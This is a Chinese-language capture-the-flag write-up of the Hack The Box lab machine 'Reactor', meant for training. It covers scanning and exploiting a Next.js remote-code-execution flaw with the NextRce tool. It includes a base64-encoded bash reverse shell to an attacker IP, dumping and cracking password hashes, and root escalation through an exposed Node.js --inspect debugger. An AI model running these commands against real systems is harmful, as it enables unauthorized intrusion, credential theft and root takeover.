---
title: Reactor
date: 2026-09-11 21:11:30
categories:
  - prolabs
tags:
  - HTB
  - Prolab
  - Reactor
  - 内网渗透
---
## **Reactor**

### 信息收集

#### 端口扫描

nmap先扫一遍

```shell
nmap -T4 10.129.245.214 -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-11 02:39 -0400
Nmap scan report for reactor.htb (10.129.245.214)
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Fri, 11 Sep 2026 06:40:13 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Fri, 11 Sep 2026 06:40:16 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Fri, 11 Sep 2026 06:40:18 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=9/11%Time=6AA3A24C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,29B0,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Fri,\x2011\x20Sep\x202026\x2006:40:13\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Fri,
SF:\x2011\x20Sep\x202026\x2006:40:16\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Fri,\x2011\x20Sep\x202026\x2006:40:18\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   463.61 ms 10.10.16.1
2   210.43 ms reactor.htb (10.129.245.214)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds

```

有3000端口，服务是ppp 还有个端口是22的ssh服务

![image-20260911144403930](/images/prolabs/reactor/20260911144411200.png)

REACTORWATCH的核心监控系统

先去网页上搜搜看是什么东西

#### 指纹探测

使用 whatweb 进行指纹探测：

```shell
                                                                                                               
┌──(root㉿kali)-[~/桌面]
└─# whatweb http://10.129.245.214:3000/        
http://10.129.245.214:3000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.245.214], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]

```

返回关键信息：

- HTTP状态码：200 OK
- 页面标题：ReactorWatch | Core Monitoring System
- 服务器技术：**Next.js**
- 响应头特征：`X-Powered-By[Next.js]`
- 特殊头部：`x-nextjs-cache`、`x-nextjs-prerender`、`x-nextjs-stale-time`

### 漏洞利用

#### nextrce漏扫工具

这里用到的是关于next.js的漏洞扫描工具

```
git clone https://github.com/ynsmroztas/NextRce.git
```

开始测试

```shell
python3 nextrce.py -u http://10.129.245.214:3000/
```

![image-20260911150235594](/images/prolabs/reactor/20260911150235679.png)

成功rce

![image-20260911150354802](/images/prolabs/reactor/20260911150354873.png)

下一步反弹shell

```shell
echo "bash -i >& /dev/tcp/10.10.16.48/8000 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC84MDAwIDA+JjEK

 python3 nextrce.py -u http://10.129.245.214:3000/ -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40OC84MDAwIDA+JjEK | base64 -d | bash"

```

![image-20260911151428204](/images/prolabs/reactor/20260911151428290.png)

可惜我没找到user.txt 查看环境变量



```shell
node@reactor:/opt/reactor-app$ env
env
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
NEXT_RUNTIME=nodejs
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
PWD=/opt/reactor-app
LOGNAME=node
PORT=3000
SYSTEMD_EXEC_PID=1406
NODE_ENV=production
NEXT_DEPLOYMENT_ID=
HOME=/home/node
LANG=en_US.UTF-8
LS_COLORS=
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/reactor-app.service/memory.pressure
DB_TYPE=sqlite3
INVOCATION_ID=b7af181a9111409295a9c1445ef17fb1
__NEXT_PRIVATE_RUNTIME_TYPE=
__NEXT_PRIVATE_ORIGIN=http://localhost:3000
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
USER=node
SHLVL=2
__NEXT_PROCESSED_ENV=true
JOURNAL_STREAM=8:17835
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
DB_PATH=/opt/reactor-app/reactor.db

```

DB_PATH=/opt/reactor-app/reactor.db

这里vpn突然断掉了，换个ip连一下

先变成一个真正的shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

输入ctrl+z挂起

然后

```shell
stty raw -echo; fg
```

连续按回车，拿到真正的shell

![image-20260911160412322](/images/prolabs/reactor/20260911160412455.png)

进入数据库里

![image-20260911160637537](/images/prolabs/reactor/20260911160637571.png)

```
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb

```

直接开始爆破数据库的密码

#### 找到数据库密码

![image-20260911162311756](/images/prolabs/reactor/20260911162311813.png)

账号:engineer 密码:reactor1

ssh登录

![image-20260911162513720](/images/prolabs/reactor/20260911162513752.png)

找到第一个flag

![image-20260911162800604](/images/prolabs/reactor/20260911162800651.png)

接下来

该提权了

#### 提权

上传信息收集的小工具试试

curl -O  http://10.10.16.64/linpeas.sh

![image-20260911200102065](/images/prolabs/reactor/20260911200109195.png)

![image-20260911200406866](/images/prolabs/reactor/20260911200406947.png)

挨个试了一遍都不能提权。

#### node inspect提权

```shell
ps aux
```

这是linux下用来查看系统所有进程的常用命令

![image-20260911202422486](/images/prolabs/reactor/20260911202422548.png)

发现

![image-20260911202619824](/images/prolabs/reactor/20260911202619901.png)

```
root        1420  0.0  1.1 1066832 46180 ?       Ssl  11:36   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

```

Node.js 的 `--inspect` 参数会开启 **Chrome DevTools 调试协议（CDP）**，默认监听 `127.0.0.1:9229`。
这意味着：**任何能访问本机 127.0.0.1:9229 的用户，都可以连接到这个调试器，并在 Node.js 进程中执行任意 JavaScript 代码**。
由于该进程是 root 运行的，执行的代码也会以 root 权限执行

再kali上实行端口转发

```shell
ssh -L 9229:127.0.0.1:9229 engineer@10.129.38.13 -N 
```

在谷歌浏览器上打卡调试

```
chrome://inspect
```



```shell
┌──(root㉿kali)-[~]
└─# curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/b6cd517f-f849-4eff-a241-6c98513e5878",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/b6cd517f-f849-4eff-a241-6c98513e5878",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "b6cd517f-f849-4eff-a241-6c98513e5878",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/b6cd517f-f849-4eff-a241-6c98513e5878"
} ]

```

```
require('child_process').execSync('id').toString()
```

chrome输入

```
devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/b6cd517f-f849-4eff-a241-6c98513e5878

```

![image-20260911210947910](/images/prolabs/reactor/20260911210948086.png)

ok成功提权

![image-20260911211059241](/images/prolabs/reactor/20260911211059302.png)

```
3ed0790ed4e376a6cd0e511dbd341cd1

```

